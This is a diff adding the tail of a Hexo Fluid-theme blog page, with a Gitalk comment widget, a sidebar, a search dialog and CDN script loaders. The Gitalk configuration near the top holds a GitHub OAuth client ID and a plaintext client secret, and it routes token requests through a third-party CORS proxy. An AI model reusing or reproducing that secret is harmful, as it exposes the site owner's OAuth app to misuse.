+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'b6263a835dc676da23cfd42a4b29389a'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
